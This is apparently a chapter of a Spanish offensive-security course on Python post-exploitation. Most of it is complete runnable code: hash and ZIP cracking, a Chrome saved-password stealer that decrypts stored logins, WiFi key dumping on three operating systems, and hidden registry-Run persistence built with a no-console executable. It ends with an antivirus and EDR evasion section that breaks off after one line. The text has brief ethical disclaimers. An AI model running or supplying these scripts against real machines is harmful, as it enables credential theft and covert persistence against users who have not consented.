| **Inicio**         | **atrás 7**                                                                |
| ------------------ | -------------------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./4_7_Python_Hacking_y_Explotacion_de_aplicaciones_Web_con_Python.md) |

---

## **Índice**

| Temario                                                                                                                               |
| ------------------------------------------------------------------------------------------------------------------------------------- |
| [259. Cracking de contraseñas y hashes con Python](#259-cracking-de-contraseñas-y-hashes-con-python)                                  |
| [260. Cracking de un fichero ZIP con contraseña](#260-cracking-de-un-fichero-zip-con-contraseña)                                      |
| [261. Obtención de contraseñas de un navegador con Python](#261-obtención-de-contraseñas-de-un-navegador-con-python)                  |
| [262. WINE: Compilar programas para Windows en Kali Linux](#262-wine-compilar-programas-para-windows-en-kali-linux)                   |
| [263. Obtención de contraseñas WiFi con Python en Windows](#263-obtención-de-contraseñas-wifi-con-python-en-windows)                  |
| [264. Obtención de contraseñas WiFi en Linux y MacOS](#264-obtención-de-contraseñas-wifi-en-linux-y-macos)                            |
| [265. Persistencia en Windows con Python](#265-persistencia-en-windows-con-python)                                                    |
| [266. Creación de un servicio de Windows con Python](#266-creación-de-un-servicio-de-windows-con-python)                              |
| [267. Evasión de defensas (Anti-Virus, EDR...) con Python](#267-evasión-de-defensas-anti-virus-edr-con-python)                        |
| [268. Genera Shellcodes (opcodes) con Python](#268-genera-shellcodes-opcodes-con-python)                                              |
| [269. Esteganografía con Python: Exfiltrar información en Imágenes](#269-esteganografía-con-python-exfiltrar-información-en-imágenes) |

---

# **Post-Explotacion y evasion de defensas con Python**

## **259. Cracking de contraseñas y hashes con Python**

### 📘 ¿Qué es el cracking de contraseñas?

El _cracking de contraseñas_ es el proceso de **recuperar contraseñas** desde datos encriptados, como **hashes**. Esto se hace generalmente usando:

- **Diccionarios (wordlists)** 🗒️
- **Fuerza bruta** 🔨
- **Ataques de tipo rainbow table** 🌈

Este proceso **no se debe usar con fines maliciosos**, sino con fines educativos, de auditoría o recuperación de contraseñas legítimas.

---

### 🧠 ¿Qué es un hash?

Un **hash** es una representación encriptada de una cadena, por ejemplo:

```python
import hashlib
print(hashlib.md5(b"hola123").hexdigest())
# Salida: 5c3194abde7de95c819bc86342b6c36f
```

Esto significa que la contraseña `"hola123"` tiene un hash MD5 específico.

⚠️ Importante: los hashes **no se pueden desencriptar directamente**, pero puedes **probar muchas contraseñas** hasta encontrar la que genere el mismo hash.

---

### 🔧 Requisitos

#### 1. Tener Python instalado

Verifica:

```bash
python --version
```

Si no lo tienes:

```bash
sudo apt install python3 python3-pip  # En Linux
```

#### 2. Crear una wordlist (archivo de posibles contraseñas)

Ejemplo: `wordlist.txt`

```
admin
password
hola123
123456
miclave123
```

---

### ✅ Código completo: Crackear hashes MD5 con una wordlist

```python
import hashlib

def crack_hash_md5(hash_objetivo, archivo_wordlist):
    try:
        with open(archivo_wordlist, 'r', encoding='utf-8') as archivo:
            for linea in archivo:
                contraseña = linea.strip()
                hash_generado = hashlib.md5(contraseña.encode()).hexdigest()

                if hash_generado == hash_objetivo:
                    print(f"✅ Contraseña encontrada: {contraseña}")
                    return contraseña

                print(f"Probando: {contraseña} → {hash_generado}")

        print("❌ Contraseña no encontrada en la wordlist.")
        return None

    except FileNotFoundError:
        print("⚠️ Archivo de wordlist no encontrado.")
        return None

# ====== CONFIGURACIÓN ======
hash_md5 = "5c3194abde7de95c819bc86342b6c36f"  # Este es el hash de 'hola123'
wordlist_path = "wordlist.txt"

# ====== EJECUCIÓN ======
crack_hash_md5(hash_md5, wordlist_path)
```

---

### 💡 ¿Cómo lo uso?

1. Guarda ese código como `crack_md5.py`
2. Crea un archivo llamado `wordlist.txt` con posibles contraseñas
3. Ejecuta:

```bash
python3 crack_md5.py
```

Si `hola123` está en el wordlist, el script dirá:

```
✅ Contraseña encontrada: hola123
```

---

### 📌 ¿Y si el hash es SHA-256 o SHA-1?

Solo cambia la función:

```python
# SHA-256
hashlib.sha256(contraseña.encode()).hexdigest()

# SHA-1
hashlib.sha1(contraseña.encode()).hexdigest()
```

---

### 🧪 Ejemplo con SHA-256

```python
import hashlib

def crack_sha256(hash_objetivo, wordlist_path):
    with open(wordlist_path, 'r') as archivo:
        for linea in archivo:
            palabra = linea.strip()
            hash_generado = hashlib.sha256(palabra.encode()).hexdigest()
            if hash_generado == hash_objetivo:
                print(f"✅ Contraseña encontrada: {palabra}")
                return
            print(f"Probando: {palabra}")
    print("❌ No encontrada")

# SHA-256 de "miclave123":
hash_sha256 = "f219c98294c270c8b8797b420fbda2b94c18c1b8483aa8b8572d43db21eeb194"
crack_sha256(hash_sha256, "wordlist.txt")
```

---

### 🔐 ¿De dónde saco hashes reales para practicar?

Solo para propósitos educativos, puedes generar tus propios hashes:

```python
import hashlib
print(hashlib.sha256(b"miclave123").hexdigest())
```

---

### ⚠️ Consideraciones legales y éticas

El **cracking de contraseñas solo debe hacerse en entornos controlados o con permisos explícitos**. Está prohibido hacerlo en sistemas sin autorización.

---

### 📚 Recursos extra

- [CrackStation](https://crackstation.net/)
- [SecLists (wordlists grandes)](https://github.com/danielmiessler/SecLists)
- [hashcat.net](https://hashcat.net/hashcat/) (herramienta avanzada para cracking)

---

[🔼](#índice)

---

## **260. Cracking de un fichero ZIP con contraseña**

### 📘 ¿Qué es?

Cuando un archivo `.zip` está protegido con contraseña, necesitas esa contraseña para extraer su contenido. Si no la tienes, puedes intentar "crackear" el archivo usando un **ataque de diccionario** (probando muchas contraseñas hasta encontrar la correcta).

---

### 🛠️ Herramientas necesarias

Solo necesitas:

1. **Python 3**
2. La biblioteca **zipfile** (viene incluida en Python)
3. Una **wordlist** (archivo de texto con posibles contraseñas)

---

### ✅ Instalación

No necesitas instalar nada extra, pero asegúrate de tener Python:

```bash
python3 --version
```

Si no lo tienes:

```bash
sudo apt update
sudo apt install python3
```

---

### 🗂️ Archivos necesarios

1. **Archivo zip protegido por contraseña**

Por ejemplo, creamos `protegido.zip` con contraseña `123456` (puedes usar cualquier compresor, como WinRAR, 7-Zip o en terminal con `zip`):

```bash
zip -e protegido.zip secreto.txt
```

Te pedirá una contraseña al crearlo.

2. **Wordlist**: lista de posibles contraseñas (llámala `wordlist.txt`)

```txt
admin
password
hola123
123456
miclave123
```

---

### 💻 Código completo en Python

Guarda este archivo como `zip_cracker.py`:

```python
import zipfile

def crack_zip(zip_path, wordlist_path):
    try:
        zip_file = zipfile.ZipFile(zip_path)
    except FileNotFoundError:
        print("❌ Archivo ZIP no encontrado.")
        return
    except zipfile.BadZipFile:
        print("❌ Archivo ZIP inválido o corrupto.")
        return

    with open(wordlist_path, 'r', encoding='utf-8') as f:
        for line in f:
            password = line.strip()
            try:
                zip_file.extractall(pwd=password.encode('utf-8'))
                print(f"\n✅ Contraseña encontrada: {password}")
                return
            except:
                print(f"Probando: {password}")

    print("❌ No se encontró la contraseña en la wordlist.")

# ====== CONFIGURACIÓN ======
zip_path = "protegido.zip"
wordlist_path = "wordlist.txt"

crack_zip(zip_path, wordlist_path)
```

---

### ▶️ Cómo ejecutarlo

1. Guarda el script como `zip_cracker.py`
2. Asegúrate de tener:

   - `protegido.zip`
   - `wordlist.txt`

3. Ejecuta:

```bash
python3 zip_cracker.py
```

**Salida esperada:**

```
Probando: admin
Probando: password
Probando: hola123
Probando: 123456

✅ Contraseña encontrada: 123456
```

Y el contenido del ZIP se extraerá en el mismo directorio.

---

### ⚠️ Consideraciones Éticas

Este tipo de prácticas debe hacerse **solo con archivos personales o de prueba**. Crackear archivos sin permiso es ilegal y va contra los principios de ética en ciberseguridad.

---

[🔼](#índice)

---

## **261. Obtención de contraseñas de un navegador con Python**

### 🧠 ¿Qué vamos a hacer?

Vamos a obtener contraseñas **guardadas por Google Chrome** usando Python. Chrome guarda contraseñas en una base de datos SQLite, y las cifra con una clave que está en otro archivo (`Local State`), protegida por el sistema operativo.

---

### 📦 ¿Dónde guarda Chrome las contraseñas?

En Windows:

- Contraseñas cifradas:
  `C:\Users\<tu_usuario>\AppData\Local\Google\Chrome\User Data\Default\Login Data`
- Clave maestra cifrada (en base64):
  `C:\Users\<tu_usuario>\AppData\Local\Google\Chrome\User Data\Local State`

---

### 🧰 Requisitos

1. Python 3
2. Módulos:

   - `pycryptodome`
   - `sqlite3` (incluido en Python)
   - `json`, `base64`, `os`, `win32crypt` (para Windows)

---

### 🛠️ Instalación

Primero, instala las dependencias necesarias:

```bash
pip install pycryptodome pypiwin32
```

---

### ✅ Script completo paso a paso

Guarda esto como `extraer_contrasenas_chrome.py`:

```python
import os
import json
import base64
import sqlite3
import shutil
from Crypto.Cipher import AES
import win32crypt

def obtener_clave():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    # La clave maestra está codificada en base64
    clave_encriptada = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

    # Elimina "DPAPI" del inicio
    clave_encriptada = clave_encriptada[5:]

    # Desencripta la clave con la API de Windows
    clave = win32crypt.CryptUnprotectData(clave_encriptada, None, None, None, 0)[1]
    return clave

def desencriptar_contraseña(password_encriptada, clave):
    try:
        iv = password_encriptada[3:15]
        payload = password_encriptada[15:]
        cipher = AES.new(clave, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception as e:
        return f"[Error al desencriptar]"

def extraer_contraseñas():
    clave = obtener_clave()
    login_db_path = os.path.join(os.environ["USERPROFILE"],
                                 "AppData", "Local", "Google", "Chrome",
                                 "User Data", "Default", "Login Data")

    # Hacemos una copia de la base de datos para evitar bloqueo
    db_copia = "Loginvault.db"
    shutil.copyfile(login_db_path, db_copia)

    conn = sqlite3.connect(db_copia)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    for fila in cursor.fetchall():
        url = fila[0]
        usuario = fila[1]
        password_encriptada = fila[2]

        password_desencriptada = desencriptar_contraseña(password_encriptada, clave)

        if usuario or password_desencriptada:
            print(f"🌐 Sitio: {url}")
            print(f"👤 Usuario: {usuario}")
            print(f"🔑 Contraseña: {password_desencriptada}")
            print("-" * 40)

    cursor.close()
    conn.close()
    os.remove(db_copia)

# Ejecutar
extraer_contraseñas()
```

---

### ▶️ ¿Cómo ejecutarlo?

1. Asegúrate de que **Chrome esté cerrado**.
2. Ejecuta el script:

```bash
python extraer_contrasenas_chrome.py
```

#### 🧪 Ejemplo de salida:

```
🌐 Sitio: https://www.facebook.com
👤 Usuario: miusuario@email.com
🔑 Contraseña: miclave123
----------------------------------------
🌐 Sitio: https://www.gmail.com
👤 Usuario: otro@gmail.com
🔑 Contraseña: contraseña123
----------------------------------------
```

---

### ✅ Conclusión

Este script:

- Extrae la clave de cifrado de Chrome
- Abre la base de datos SQLite que contiene las credenciales
- Desencripta las contraseñas
- Muestra todo en consola

---

### 🚫 Seguridad

Chrome cifra sus contraseñas con una clave ligada al perfil del sistema operativo (Windows DPAPI). Este método **solo funciona si estás en el mismo sistema del usuario que guardó las contraseñas.**

---

[🔼](#índice)

---

## **262. WINE: Compilar programas para Windows en Kali Linux**

### 🧠 ¿Qué es WINE?

**WINE** (Wine Is Not an Emulator) es una capa de compatibilidad que permite ejecutar aplicaciones de Windows en sistemas operativos tipo Unix como Linux, macOS y BSD.

> 🧪 _Wine no emula Windows, sino que traduce llamadas del sistema de Windows a llamadas POSIX en tiempo real._

---

### 📦 ¿Qué puedes hacer con WINE?

- Ejecutar programas `.exe` o `.msi`
- Instalar software de Windows
- Compilar y ejecutar binarios `.exe` desde C/C++
- Usar herramientas de análisis o malware hechas solo para Windows

---

### 🛠️ Instalación de WINE en Kali Linux

#### ✅ Paso 1: Actualiza el sistema

```bash
sudo apt update && sudo apt upgrade
```

#### ✅ Paso 2: Instala WINE

```bash
sudo apt install wine64
```

Puedes verificar la instalación con:

```bash
wine --version
```

Ejemplo de salida:

```
wine-8.0.1
```

---

### 🎯 Usar WINE para ejecutar un `.exe`

Supongamos que tienes el archivo `notepad++.exe`.

#### Paso 1: Descarga el `.exe`

```bash
wget https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.6.4/npp.8.6.4.Installer.exe
```

#### Paso 2: Ejecuta con Wine

```bash
wine npp.8.6.4.Installer.exe
```

> Se abrirá el instalador como si estuvieras en Windows. Sigue los pasos normalmente.

---

### 👨‍💻 ¿Cómo compilar programas C/C++ para Windows en Kali con Wine?

#### ✅ Requisitos

1. Wine (`wine64`)
2. Mingw-w64 → Compilador cruzado para generar ejecutables `.exe` en Linux

```bash
sudo apt install mingw-w64
```

---

### 🧪 Ejemplo: Programa “Hola mundo” para Windows

#### Paso 1: Crea el archivo `hola.c`

```c
#include <windows.h>

int main() {
    MessageBox(0, "Hola desde Windows", "Mi programa", MB_OK);
    return 0;
}
```

> Esto mostrará un mensaje de alerta (MessageBox) como los de Windows.

#### Paso 2: Compila el programa con MinGW

```bash
x86_64-w64-mingw32-gcc hola.c -o hola.exe
```

#### Paso 3: Ejecuta con Wine

```bash
wine hola.exe
```

> Verás una ventana emergente de Windows con el mensaje `"Hola desde Windows"`.

---

### 📁 Extra: Directorios de WINE

- Wine crea una carpeta tipo "C:" en tu sistema Linux:

  ```bash
  ~/.wine/drive_c/
  ```

Aquí puedes mover programas o archivos como si estuvieras en un Windows.

---

### 🧪 Bonus: Ejecutar malware en un entorno controlado

Si estás estudiando **análisis de malware**, puedes usar Wine junto a herramientas como:

- `Procmon` (sysinternals)
- `Wireshark` para tráfico
- Snapshots de VirtualBox

Pero **⚠️ nunca hagas esto en tu máquina principal**. Usa una VM sin conexión y sin datos personales.

---

### ✅ Conclusión

| Acción                      | Comando                                     |
| --------------------------- | ------------------------------------------- |
| Instalar Wine               | `sudo apt install wine64`                   |
| Instalar compilador Windows | `sudo apt install mingw-w64`                |
| Compilar un `.exe`          | `x86_64-w64-mingw32-gcc file.c -o file.exe` |
| Ejecutar un `.exe`          | `wine archivo.exe`                          |

---

[🔼](#índice)

---

## **263. Obtención de contraseñas WiFi con Python en Windows**

### 🔐 ¿Qué es la obtención de contraseñas WiFi con Python?

En Windows, cuando te conectas a una red WiFi, el sistema guarda el perfil de esa red, incluyendo (en muchos casos) la contraseña. Usando comandos del sistema, **Python puede acceder a estos perfiles y extraer la información**, como el SSID y la clave, si está guardada.

---

### 🧠 ¿Cómo funciona?

Windows guarda los perfiles WiFi con el comando `netsh wlan show profiles`.
Luego, puedes ver la contraseña con:

```bash
netsh wlan show profile name="NombreDeRed" key=clear
```

Esto muestra la clave (si está almacenada) en la sección `Contenido de la clave`.

Python puede:

- Ejecutar este comando con `subprocess`.
- Leer la salida.
- Buscar la contraseña con expresiones regulares o simplemente parseando líneas.

---

### 🛠️ Requisitos e instalación

No necesitas instalar librerías externas si estás en **Windows**. Solo necesitas:

- Tener Python instalado. [Descargar Python](https://www.python.org/downloads/)
- Usar el módulo estándar `subprocess`

---

### ✅ Paso a paso para hacerlo

#### 1. Ver los perfiles WiFi guardados

Ejecuta en CMD:

```cmd
netsh wlan show profiles
```

Te mostrará algo como:

```
Perfiles de usuario:
    Todos los perfiles de usuario en esta interfaz:

    Perfil de todos los usuarios     : MiRedWiFi
    Perfil de todos los usuarios     : Casa
    Perfil de todos los usuarios     : Trabajo
```

#### 2. Ver la contraseña de una red

```cmd
netsh wlan show profile name="Casa" key=clear
```

Busca la línea:

```
Contenido de la clave        : mipassword123
```

---

### 🐍 Código Python completo y explicado

Aquí tienes un script que:

1. Lista todos los perfiles.
2. Intenta obtener la contraseña de cada uno.
3. Muestra los que tienen una clave almacenada.

```python
import subprocess

def obtener_perfiles():
    """Obtiene todos los perfiles WiFi guardados en el sistema."""
    resultado = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
    perfiles = []
    for linea in resultado.splitlines():
        if "Todos los perfiles de usuario" in linea:
            # Extrae el nombre del perfil
            perfil = linea.split(":")[1].strip()
            perfiles.append(perfil)
    return perfiles

def obtener_contraseña(perfil):
    """Obtiene la contraseña del perfil dado."""
    comando = f'netsh wlan show profile name="{perfil}" key=clear'
    resultado = subprocess.check_output(comando, shell=True, text=True)
    for linea in resultado.splitlines():
        if "Contenido de la clave" in linea:
            return linea.split(":")[1].strip()
    return None

def mostrar_todas_contraseñas():
    perfiles = obtener_perfiles()
    for perfil in perfiles:
        contraseña = obtener_contraseña(perfil)
        if contraseña:
            print(f"[+] {perfil}: {contraseña}")
        else:
            print(f"[-] {perfil}: No se encontró contraseña (puede estar oculta o no almacenada)")

if __name__ == "__main__":
    mostrar_todas_contraseñas()
```

---

### 🔎 Ejemplo de salida

```
[+] MiRedWiFi: clave12345
[+] Casa: contraseñasecreta
[-] Trabajo: No se encontró contraseña (puede estar oculta o no almacenada)
```

---

### 💡 Notas importantes

- Este script **solo funciona en Windows**.
- Debes ejecutarlo en una consola con **permisos de administrador** si hay restricciones.
- No puede obtener contraseñas de redes a las que **nunca te has conectado**.

---

[🔼](#índice)

---

## **264. Obtención de contraseñas WiFi en Linux y MacOS**

### 🧠 ¿Cómo funciona?

En ambos sistemas operativos, las contraseñas WiFi se almacenan **después de conectarse a una red**:

| Sistema   | Dónde se guarda                                                                                     |
| --------- | --------------------------------------------------------------------------------------------------- |
| **Linux** | En archivos de texto plano en `/etc/NetworkManager/system-connections/` (requiere permisos de root) |
| **macOS** | En el **Llavero del sistema (Keychain Access)**                                                     |

---

### 🔧 Requisitos previos

#### Linux

- Tener **Python 3** instalado.
- Acceso a terminal.
- Permisos de administrador (usando `sudo`).
- NetworkManager (presente en Ubuntu, Debian, Fedora, etc.)

#### macOS

- Tener Python 3 instalado.
- Acceso a terminal.
- Acceso autorizado al Llavero del sistema.

---

### 🐧 LINUX: Obtención de contraseñas WiFi

#### 📂 ¿Dónde están las contraseñas?

Las contraseñas WiFi se almacenan en:

```bash
/etc/NetworkManager/system-connections/
```

Cada red WiFi tiene un archivo `.nmconnection` (o sin extensión), con contenido como este:

```ini
[wifi-security]
key-mgmt=wpa-psk
psk=miclavewifi
```

#### 🛠 Instalación (nada extra si ya tienes Python 3):

```bash
sudo apt update
sudo apt install python3
```

---

#### ✅ Script Python para Linux

```python
import os
import configparser

def obtener_contraseñas_linux():
    ruta = "/etc/NetworkManager/system-connections/"
    redes = []

    if not os.path.exists(ruta):
        print("No se encontró la ruta. ¿Tienes NetworkManager?")
        return

    for archivo in os.listdir(ruta):
        ruta_completa = os.path.join(ruta, archivo)
        if os.path.isfile(ruta_completa):
            config = configparser.ConfigParser()
            try:
                with open(ruta_completa, 'r', encoding='utf-8', errors='ignore') as f:
                    config.read_file(f)
                    ssid = config.get('wifi', 'ssid', fallback=None)
                    password = config.get('wifi-security', 'psk', fallback=None)
                    if ssid:
                        redes.append((ssid, password if password else "Sin clave encontrada"))
            except Exception as e:
                print(f"Error leyendo {archivo}: {e}")

    for ssid, clave in redes:
        print(f"[+] {ssid}: {clave}")

if __name__ == "__main__":
    obtener_contraseñas_linux()
```

📌 **Importante**: Ejecuta el script con `sudo`, ya que esos archivos son del sistema:

```bash
sudo python3 wifi_linux.py
```

---

### 🍏 MACOS: Obtención de contraseñas WiFi

#### 🧰 ¿Dónde están?

macOS guarda las contraseñas WiFi en el **Llavero** (Keychain). Puedes verlas manualmente con:

```bash
security find-generic-password -ga NombreDeRed
```

macOS pedirá autorización para acceder al llavero.

---

#### ✅ Script Python para macOS

```python
import subprocess

def obtener_contraseña_macos(ssid):
    try:
        resultado = subprocess.check_output(
            ["security", "find-generic-password", "-ga", ssid],
            stderr=subprocess.STDOUT,
            text=True
        )
        for linea in resultado.splitlines():
            if "password:" in linea:
                return linea.split(":", 1)[1].strip().replace('"', '')
        return "No se encontró contraseña"
    except subprocess.CalledProcessError as e:
        return "Error o no se encontró la red"

def main():
    redes = ["Casa", "Trabajo", "MiRed"]  # Puedes cambiar por tus SSIDs conocidos
    for red in redes:
        clave = obtener_contraseña_macos(red)
        print(f"[+] {red}: {clave}")

if __name__ == "__main__":
    main()
```

📌 Este script solicita acceso al **Llavero del sistema**. Debes aceptar cuando macOS lo pida.

---

### 🔚 Conclusión

| Plataforma | Método                                                     | Permisos                         |
| ---------- | ---------------------------------------------------------- | -------------------------------- |
| **Linux**  | Leer archivos en `/etc/NetworkManager/system-connections/` | Requiere `sudo`                  |
| **macOS**  | Usar el comando `security` para acceder al llavero         | Solicita autorización al usuario |

---

[🔼](#índice)

---

## **265. Persistencia en Windows con Python**

### 🔐 ¿Qué es la _persistencia_ en Windows?

**Persistencia** significa que un programa se ejecuta **automáticamente cada vez que se inicia el sistema operativo** (por ejemplo, cuando se prende la PC).

Esto se puede usar para:

- Automatizar tareas (por ejemplo, abrir un programa al iniciar).
- Ejecutar herramientas de administración o monitoreo.
- ⚠️ También lo usan herramientas maliciosas (malware), por eso hay que usarlo **éticamente**.

---

### ✅ ¿Cómo lograr persistencia en Windows con Python?

Hay varias formas. Las más comunes son:

| Método                                  | Explicación                                                                            |
| --------------------------------------- | -------------------------------------------------------------------------------------- |
| **Registro (Registry)**                 | Agrega una entrada en el registro de Windows para que el script se ejecute al iniciar. |
| **Carpeta de inicio (Startup folder)**  | Coloca un acceso directo al script en la carpeta de inicio del usuario.                |
| **Tareas programadas (Task Scheduler)** | Crea una tarea que se ejecute automáticamente al iniciar sesión o encender el equipo.  |

Usaremos **la opción del Registro de Windows**, porque es sencilla y muy usada.

---

### 🧱 ¿Qué necesitas?

- Tener **Python instalado**.
- El módulo estándar `winreg` (ya viene con Python).
- Convertir tu script en `.exe` si no quieres que el usuario vea la consola de Python (opcional).

---

### 🛠️ ¿Cómo se instala o configura?

1. Asegúrate de tener Python en tu sistema:

```bash
python --version
```

2. Opcionalmente, instala `pyinstaller` para convertir tu script en `.exe`:

```bash
pip install pyinstaller
```

3. Puedes compilar tu script así:

```bash
pyinstaller --noconsole --onefile tu_script.py
```

Esto generará un `.exe` que puedes usar para establecer la persistencia.

---

### 🐍 Código Python de persistencia usando el Registro de Windows

#### 🧠 ¿Qué hace este script?

- Copia el `.exe` a una carpeta oculta (`AppData\Roaming`).
- Crea una entrada en el **registro de inicio automático de Windows** para que se ejecute al iniciar sesión.

#### ✅ Script completo explicado

```python
import os
import shutil
import sys
import winreg

def agregar_persistencia(nombre_programa="MyApp"):
    # Ruta al ejecutable (el script se debe haber convertido a .exe)
    ubicacion_origen = sys.executable  # El .exe actual
    carpeta_destino = os.getenv("APPDATA")  # C:\Users\Usuario\AppData\Roaming
    ubicacion_destino = os.path.join(carpeta_destino, f"{nombre_programa}.exe")

    try:
        # Copia el .exe a AppData
        shutil.copyfile(ubicacion_origen, ubicacion_destino)
        print(f"[+] Copiado a {ubicacion_destino}")
    except Exception as e:
        print(f"[!] Error al copiar el archivo: {e}")
        return

    # Agrega al registro
    try:
        clave = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(clave, nombre_programa, 0, winreg.REG_SZ, ubicacion_destino)
        winreg.CloseKey(clave)
        print(f"[+] Persistencia agregada en el registro con nombre '{nombre_programa}'")
    except Exception as e:
        print(f"[!] Error al escribir en el registro: {e}")

if __name__ == "__main__":
    agregar_persistencia("MyApp")
```

---

### 🔎 ¿Qué verás en el registro?

Se creará una clave en:

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```

Con un valor como:

```
"MyApp" = "C:\Users\TuUsuario\AppData\Roaming\MyApp.exe"
```

Cada vez que se inicie sesión en Windows, ese `.exe` se ejecutará automáticamente.

---

### 🔄 ¿Cómo quitar la persistencia?

Puedes eliminarla así:

```python
def eliminar_persistencia(nombre_programa="MyApp"):
    try:
        clave = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_ALL_ACCESS
        )
        winreg.DeleteValue(clave, nombre_programa)
        winreg.CloseKey(clave)
        print(f"[+] Persistencia eliminada")
    except FileNotFoundError:
        print("[-] La entrada no existe")
    except Exception as e:
        print(f"[!] Error: {e}")
```

---

### 📦 Otras formas de persistencia en Windows (opcional)

1. **Carpeta de inicio**:

```python
startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
shutil.copyfile("tu_script.exe", os.path.join(startup, "nombre.exe"))
```

2. **Tareas programadas**:
   Usa `schtasks` desde Python o la terminal.

---

### ✅ Resumen

- **Persistencia = tu script se ejecuta al iniciar Windows.**
- Lo hicimos usando el **registro de Windows**.
- El script copia tu ejecutable y crea una entrada en el registro.
- Puedes **revertirlo** eliminando la clave del registro.

---

[🔼](#índice)

---

## **266. Creación de un servicio de Windows con Python**

### 🧠 ¿Qué es un servicio de Windows?

Un **servicio de Windows** es un programa que se ejecuta **en segundo plano** (background), sin necesidad de que un usuario inicie sesión. Puede iniciarse automáticamente cuando se prende la computadora.

> Ejemplos de servicios: antivirus, actualizaciones, sincronizadores como OneDrive.

---

### ✅ ¿Por qué crear un servicio con Python?

Porque puedes usarlo para:

- Automatizar tareas en segundo plano.
- Ejecutar scripts sin depender del usuario.
- Programar tareas de monitoreo, backups, etc.

---

### 🛠 Requisitos previos

#### 1. Tener Python instalado

Descárgalo desde [https://python.org](https://www.python.org)

Verifica en terminal:

```bash
python --version
```

#### 2. Instalar la librería `pywin32`

Es una librería que permite a Python interactuar con el sistema operativo Windows (incluyendo servicios).

Instala con:

```bash
pip install pywin32
```

---

### 📦 ¿Qué hace un servicio de Windows?

Un servicio en Python se basa en una clase que **hereda de `win32serviceutil.ServiceFramework`** y tiene:

| Método       | Descripción                              |
| ------------ | ---------------------------------------- |
| `__init__()` | Inicializa el servicio.                  |
| `SvcDoRun()` | Lo que hace el servicio cuando inicia.   |
| `SvcStop()`  | Qué hacer cuando se detiene el servicio. |

---

### ✅ Estructura básica del servicio

```python
import win32serviceutil
import win32service
import win32event
import servicemanager
import time

class MiServicio(win32serviceutil.ServiceFramework):
    _svc_name_ = "MiServicioPython"
    _svc_display_name_ = "Mi Primer Servicio en Python"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.running = True

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.running = False
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, '')
        )
        self.main()

    def main(self):
        while self.running:
            with open("C:\\temp\\servicio_log.txt", "a") as f:
                f.write("Servicio activo...\n")
            time.sleep(10)

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(MiServicio)
```

---

### 📁 ¿Qué hace este servicio?

1. Se registra como **"MiServicioPython"**.
2. Cada 10 segundos, escribe `"Servicio activo..."` en un archivo de log.
3. Puedes iniciar, detener o eliminar el servicio con comandos.

---

### 🛠 Cómo instalar y usar el servicio

#### Paso 1: Guarda el script

Guarda como `mi_servicio.py`.

#### Paso 2: Abre CMD como administrador

Esto es **obligatorio** para instalar servicios.

#### Paso 3: Instala el servicio

```bash
python mi_servicio.py install
```

#### Paso 4: Inicia el servicio

```bash
python mi_servicio.py start
```

#### Paso 5: Verifica

Revisa si el archivo `C:\temp\servicio_log.txt` se está llenando.

> ⚠️ Crea primero la carpeta `C:\temp` si no existe.

#### Paso 6: Detén el servicio

```bash
python mi_servicio.py stop
```

#### Paso 7: Elimina el servicio

```bash
python mi_servicio.py remove
```

---

### 🧪 ¿Dónde ver los errores?

- En el **Visor de eventos** de Windows (`eventvwr.msc`).
- En la consola cuando lo pruebas manualmente.

---

### 🎁 ¿Quieres que haga algo diferente?

Puedes cambiar el contenido de `main()` para que:

- Envíe correos.
- Haga scraping web.
- Supervise carpetas.
- Lea sensores o APIs.

---

### 📌 Resumen

| Acción            | Comando                         |
| ----------------- | ------------------------------- |
| Instalar servicio | `python mi_servicio.py install` |
| Iniciar servicio  | `python mi_servicio.py start`   |
| Detener servicio  | `python mi_servicio.py stop`    |
| Eliminar servicio | `python mi_servicio.py remove`  |

---

[🔼](#índice)

---

## **267. Evasión de defensas (Anti-Virus, EDR...) con Python**

### 🎯 ¿Qué significa evadir defensas?

**Evasión de defensas** significa hacer que un programa malicioso (como un backdoor, keylogger, o shell reversa) **no sea detectado** por soluciones de seguridad como:

- Antivirus (AV)
- EDR (Endpoint Detection and Response)
- Firewalls
- Sandboxes

🔐 Se usa en **red team**, **pentesting avanzado** y también (lamentablemente) por atacantes reales.

---

### 🧠 ¿Cómo detectan los antivirus un archivo?

1. **Firmas (signature-based)**: detectan patrones específicos en el binario o script.
2. **Heurística**: si el comportamiento parece sospechoso (leer teclas, abrir sockets, cifrar archivos...).
3. **Análisis dinámico**: lo ejecutan en un entorno simulado (sandbox).
4. **Machine learning**: muchos EDR usan modelos para detectar comportamientos anómalos.

---

### 🔍 Técnicas de evasión comunes (y legales en laboratorio)

| Técnica                                | Qué hace                                                              | Legal en laboratorio |
| -------------------------------------- | --------------------------------------------------------------------- | -------------------- |
| **Ofuscación**                         | Oculta el contenido del código (nombres de variables, strings...)     | ✅                   |
| **Empaquetado**                        | Convierte el script en `.exe` y lo cambia con herramientas            | ✅                   |
| **Cifrado/decodificación de payloads** | Oculta el código en base64 o XOR y lo decodifica en memoria           | ✅                   |
| **Uso de memoria/reflective loading**  | Ejecuta código sin escribirlo en disco                                | ✅ avanzado          |
| **Bypass de AMSI**                     | Salta la protección del Antimalware Scan Interface (Windows Defender) | ⚠️ sí, pero sensible |

---

### 🛠️ Requisitos para laboratorio

1. Python 3 instalado.
